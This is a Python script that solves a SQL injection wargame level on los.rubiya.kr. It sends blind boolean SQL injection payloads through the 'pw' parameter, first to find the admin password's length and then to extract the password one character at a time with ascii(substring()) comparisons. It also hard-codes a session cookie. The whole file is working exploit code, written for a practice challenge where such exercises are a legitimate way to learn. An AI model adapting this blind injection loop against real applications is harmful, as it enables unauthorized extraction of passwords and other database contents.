from requests import *
# try_payload ="pw=123' or length(pw) < 10 -- char(32)"
cookie = dict(PHPSESSID="sftmn1nhpsjgke59r39nfn03nv") # This is my cookie

for i in range (10):
    payload = "?pw=123' or id='admin' and length(pw) = " + str(i) + " -- char(32)"
    a = get("https://los.rubiya.kr/chall/orc_60e5b360f95c1f9688e4f3a86c5dd494.php" + payload, cookies=cookie)
    if "Hello admin" in a.text:
        print(payload)
        print("The length of password is", i)

# =================================================================================================

from requests import *
try_payload ="pw=123' or length(pw) < 10 -- char(32)"
cookie = dict(PHPSESSID="sftmn1nhpsjgke59r39nfn03nv")


adminPassword = ""

print("==============================================================")

for i in range (1,9):
    for j in range(32, 127):
        payload = "?pw=123' or ascii(substring(pw, " + str(i) + ", 1)) = '" + str(j) + "' -- char(32)"
        a = get("https://los.rubiya.kr/chall/orc_60e5b360f95c1f9688e4f3a86c5dd494.php" + payload, cookies=cookie)
        if "Hello admin" in a.text:
            print(payload)
            print("The position of ", i, "has value: ", chr(j))
            print("==============================================================")
            adminPassword += chr(j)
            break

print("Password of Administrator: ", adminPassword)

